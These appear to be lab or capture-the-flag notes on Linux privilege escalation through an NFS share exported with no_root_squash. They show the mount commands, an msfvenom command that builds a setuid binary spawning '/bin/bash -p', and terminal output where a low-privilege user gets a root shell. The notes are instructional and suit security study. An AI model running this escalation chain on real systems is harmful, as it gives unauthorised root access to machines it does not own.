
Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user. If root squashing is off:

`sudo su`
`mkdir /tmp/nfs`
`mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs`

- `-o`: mount options
- `rw`: It stands for "read-write," indicating that the filesystem should be mounted with both read and write permissions. Without this option, the filesystem would be mounted as read-only by default.
- `vers=3`: This specifies the NFS protocol version to use. In this case, it's version 3. NFS (Network File System) is a distributed file system protocol, and version 3 is one of the earlier versions. It's specifying that the NFS share should be accessed using version 3 of the protocol.

`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
`chmod +xs /tmp/nfs/shell.elf`

---

Is root squashing off?
```sh
user@debian:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)
```

Connect to dir as root + create exploit:
```sh
┌──(kali㉿kali)-[~]
└─$ sudo su                  
┌──(root㉿kali)-[/home/kali]
└─# mkdir /tmp/nfs
┌──(root㉿kali)-[/home/kali]
└─# mount -o rw,vers=3 10.10.221.227:/tmp /tmp/nfs
Created symlink /run/systemd/system/remote-fs.target.wants/rpc-statd.service → /usr/lib/systemd/system/rpc-statd.service.
┌──(root㉿kali)-[/home/kali]
└─# msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 48 bytes
Final size of elf file: 132 bytes
Saved as: /tmp/nfs/shell.elf
┌──(root㉿kali)-[/home/kali]
└─# chmod +xs /tmp/nfs/shell.elf
```

run it:
```sh
user@debian:~$ /tmp/shell.elf 
bash-4.1# whoami
root
bash-4.1# exit
exit
user@debian:~$ 
```
